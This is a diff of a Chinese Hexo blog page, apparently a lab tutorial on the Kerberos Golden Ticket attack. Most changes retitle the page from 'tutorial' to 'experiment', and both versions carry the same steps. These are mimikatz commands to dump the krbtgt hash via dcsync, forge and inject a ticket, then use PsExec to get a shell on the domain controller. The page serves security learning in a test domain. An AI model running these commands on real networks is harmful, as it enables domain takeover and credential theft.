@@ -8,7 +8,7 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    黄金票据实现教程 |  Tranquillity
+    黄金票据实验 |  Tranquillity
   </title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   
@@ -33,7 +33,7 @@
   <div id="app">
     <main class="content">
       <section class="outer">
-  <article id="post-黄金票据实现教程" class="article article-type-post" itemscope
+  <article id="post-黄金票据实验" class="article article-type-post" itemscope
   itemprop="blogPost" data-scroll-reveal>
 
   <div class="article-inner">
@@ -41,7 +41,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  黄金票据实现教程
+  黄金票据实验
 </h1>
   
 
@@ -50,12 +50,12 @@
 
     
     <div class="article-meta">
-      <a href="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/" class="article-date">
+      <a href="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E9%AA%8C/" class="article-date">
   <time datetime="2020-02-12T04:40:51.000Z" itemprop="datePublished">2020-02-12</time>
 </a>
       
   <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%95%99%E7%A8%8B/">教程</a> / <a class="article-category-link" href="/categories/%E6%95%99%E7%A8%8B/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/">黄金票据/白银票据</a>
+    <a class="article-category-link" href="/categories/%E6%95%99%E7%A8%8B/">教程</a> / <a class="article-category-link" href="/categories/%E6%95%99%E7%A8%8B/%E5%AE%9E%E9%AA%8C/">实验</a>
   </div>
 
       
@@ -65,7 +65,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">490字</span>
+            <span class="post-count">493字</span>
         </span>
     </span>
 
@@ -100,7 +100,7 @@
       
 
       
-      <h3 id="实验前需要准备的环境及工具："><a href="#实验前需要准备的环境及工具：" class="headerlink" title="实验前需要准备的环境及工具："></a>实验前需要准备的环境及工具：</h3><h4 id="实验工具："><a href="#实验工具：" class="headerlink" title="实验工具："></a>实验工具：</h4><ul>
+      <h3 id="0x01-实验前需要准备的环境及工具"><a href="#0x01-实验前需要准备的环境及工具" class="headerlink" title="0x01 实验前需要准备的环境及工具"></a>0x01 实验前需要准备的环境及工具</h3><h4 id="实验工具："><a href="#实验工具：" class="headerlink" title="实验工具："></a>实验工具：</h4><ul>
 <li><p><a href="PsExec64.exe">PsExec64</a> 工具是内网渗透中的免杀渗透利器。</p>
 </li>
 <li><p><a href="mimikatz_trunk.zip">mimikatz_trunk</a> 工具的功能是直接从 lsass.exe 进程里获取windows处于active状态账号的明文密码，还可以提升进程权限、注入进程、读取进程内存等等。</p>
@@ -110,7 +110,7 @@
 <li>Windows server 2008 作为域控制器，域为 yuming.com</li>
 <li>Windows 7 作为 yuming域下的一台设备</li>
 </ul>
-<h3 id="黄金票据条件："><a href="#黄金票据条件：" class="headerlink" title="黄金票据条件："></a>黄金票据条件：</h3><ol>
+<h3 id="0x02-黄金票据条件"><a href="#0x02-黄金票据条件" class="headerlink" title="0x02 黄金票据条件"></a>0x02 黄金票据条件</h3><ol>
 <li>域名称[AD PowerShell模块：（Get-ADDomain）.DNSRoot]</li>
 <li>域的SID 值[AD PowerShell模块：（Get-ADDomain）.DomainSID.Value]</li>
 <li>域的KRBTGT账户NTLM密码哈希</li>
@@ -118,18 +118,18 @@
 </ol>
 <a id="more"></a>
 
-<h3 id="实验过程："><a href="#实验过程：" class="headerlink" title="实验过程："></a>实验过程：</h3><h4 id="1-获取域控制器的-krbtgt-哈希值"><a href="#1-获取域控制器的-krbtgt-哈希值" class="headerlink" title="1. 获取域控制器的 krbtgt 哈希值"></a>1. 获取域控制器的 krbtgt 哈希值</h4><h5 id="在域控制器上操作："><a href="#在域控制器上操作：" class="headerlink" title="在域控制器上操作："></a>在域控制器上操作：</h5><p>通过 mimikatz 输入命令获取 ktbtgt 的哈希值：lsadump::dcsync /domain:test.com /user:krbtgt<br>也可以通过wce、gethashes等方式获取。<br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-1.png" alt></p>
+<h3 id="0x03-实验步骤"><a href="#0x03-实验步骤" class="headerlink" title="0x03 实验步骤"></a>0x03 实验步骤</h3><h4 id="1-获取域控制器的-krbtgt-哈希值"><a href="#1-获取域控制器的-krbtgt-哈希值" class="headerlink" title="1. 获取域控制器的 krbtgt 哈希值"></a>1. 获取域控制器的 krbtgt 哈希值</h4><h5 id="在域控制器上操作："><a href="#在域控制器上操作：" class="headerlink" title="在域控制器上操作："></a>在域控制器上操作：</h5><p>通过 mimikatz 输入命令获取 ktbtgt 的哈希值：lsadump::dcsync /domain:test.com /user:krbtgt<br>也可以通过wce、gethashes等方式获取。<br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E9%AA%8C/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-1.png" alt></p>
 <h4 id="2-伪造票据（低权限域用户在客户端上伪造）"><a href="#2-伪造票据（低权限域用户在客户端上伪造）" class="headerlink" title="2. 伪造票据（低权限域用户在客户端上伪造）"></a>2. 伪造票据（低权限域用户在客户端上伪造）</h4><h5 id="在-yuming域下的设备（Windows-7）上操作："><a href="#在-yuming域下的设备（Windows-7）上操作：" class="headerlink" title="在 yuming域下的设备（Windows 7）上操作："></a>在 yuming域下的设备（Windows 7）上操作：</h5><p>得到 KRBTGT HASH 之后使用 mimikatz 中的 kerberos::golden 功能生成金票 golden.kiribi，即为伪造成功的TGT。</p>
-<h5 id="参数说明："><a href="#参数说明：" class="headerlink" title="参数说明："></a>参数说明：</h5><p>/admin:伪造的用户名<br>/domain:域名称<br>/sid:SID 值，域的SID<br>/krbtgt:krbtgt 的 NTLM-HASH 值<br>/ticket:生成的票据名称<br>生成金票命令：kerberos::golden /admin:administrator /domain:test.com /sid:S-1-5-21-593020204-2933201490-533286667 /krbtgt:8894a0f0182bff68e84bd7ba767ac8ed /ticket:golden.kiribi<br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-2-1.png" alt><br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-2-2.png" alt></p>
-<h4 id="3-获取权限"><a href="#3-获取权限" class="headerlink" title="3. 获取权限"></a>3. 获取权限</h4><h5 id="在-yuming域下的设备（Windows-7）上操作：-1"><a href="#在-yuming域下的设备（Windows-7）上操作：-1" class="headerlink" title="在 yuming域下的设备（Windows 7）上操作："></a>在 yuming域下的设备（Windows 7）上操作：</h5><p>清空本地票据缓存，导入伪造的票据<br>查看本地保存的票据，观察Client name：kerberos::list<br>清理本地票据缓存：kerberos::purge<br>导入伪造的黄金票据：kerberos::ptt golden.kiribi<br>查看本地保存的票据，观察Client name：kerberos::list<br>票据20分钟内有效，过期之后可以再次导入<br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-3-1.png" alt><br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-3-2.png" alt><br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-3-3.png" alt><br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-3-4.png" alt></p>
-<h4 id="4-利用伪造的黄金票据"><a href="#4-利用伪造的黄金票据" class="headerlink" title="4. 利用伪造的黄金票据"></a>4. 利用伪造的黄金票据</h4><h5 id="在-yuming域下的设备（Windows-7）上操作：-2"><a href="#在-yuming域下的设备（Windows-7）上操作：-2" class="headerlink" title="在 yuming域下的设备（Windows 7）上操作："></a>在 yuming域下的设备（Windows 7）上操作：</h5><p>直接利用psexec.exe远程登录和执行命令<br>Whoami显示当前用户为 yuming域的administrator用户<br>PsExec.exe \域控计算机名 cmd.exe<br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-4.png" alt></p>
+<h5 id="参数说明："><a href="#参数说明：" class="headerlink" title="参数说明："></a>参数说明：</h5><p>/admin:伪造的用户名<br>/domain:域名称<br>/sid:SID 值，域的SID<br>/krbtgt:krbtgt 的 NTLM-HASH 值<br>/ticket:生成的票据名称<br>生成金票命令：kerberos::golden /admin:administrator /domain:test.com /sid:S-1-5-21-593020204-2933201490-533286667 /krbtgt:8894a0f0182bff68e84bd7ba767ac8ed /ticket:golden.kiribi<br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E9%AA%8C/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-2-1.png" alt><br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E9%AA%8C/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-2-2.png" alt></p>
+<h4 id="3-获取权限"><a href="#3-获取权限" class="headerlink" title="3. 获取权限"></a>3. 获取权限</h4><h5 id="在-yuming域下的设备（Windows-7）上操作：-1"><a href="#在-yuming域下的设备（Windows-7）上操作：-1" class="headerlink" title="在 yuming域下的设备（Windows 7）上操作："></a>在 yuming域下的设备（Windows 7）上操作：</h5><p>清空本地票据缓存，导入伪造的票据<br>查看本地保存的票据，观察Client name：kerberos::list<br>清理本地票据缓存：kerberos::purge<br>导入伪造的黄金票据：kerberos::ptt golden.kiribi<br>查看本地保存的票据，观察Client name：kerberos::list<br>票据20分钟内有效，过期之后可以再次导入<br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E9%AA%8C/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-3-1.png" alt><br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E9%AA%8C/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-3-2.png" alt><br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E9%AA%8C/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-3-3.png" alt><br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E9%AA%8C/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-3-4.png" alt></p>
+<h4 id="4-利用伪造的黄金票据"><a href="#4-利用伪造的黄金票据" class="headerlink" title="4. 利用伪造的黄金票据"></a>4. 利用伪造的黄金票据</h4><h5 id="在-yuming域下的设备（Windows-7）上操作：-2"><a href="#在-yuming域下的设备（Windows-7）上操作：-2" class="headerlink" title="在 yuming域下的设备（Windows 7）上操作："></a>在 yuming域下的设备（Windows 7）上操作：</h5><p>直接利用psexec.exe远程登录和执行命令<br>Whoami显示当前用户为 yuming域的administrator用户<br>PsExec.exe \域控计算机名 cmd.exe<br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E9%AA%8C/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-4.png" alt></p>
 
       
       <!-- 打赏 -->
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/" data-id="ck6kkw5hp000i64wrcn8zecnb"
+      <a data-url="http://yoursite.com/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E9%AA%8C/" data-id="ck6svvqb80017lwwrgllshvgq"
         class="article-share-link">Share</a>
       
     </footer>
@@ -140,11 +140,11 @@
   
   <nav class="article-nav">
     
-      <a href="/2020/%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/" class="article-nav-link">
+      <a href="/2020/%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E5%AE%9E%E9%AA%8C/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            白银票据实现教程
+            白银票据实验
           
         </div>
       </a>
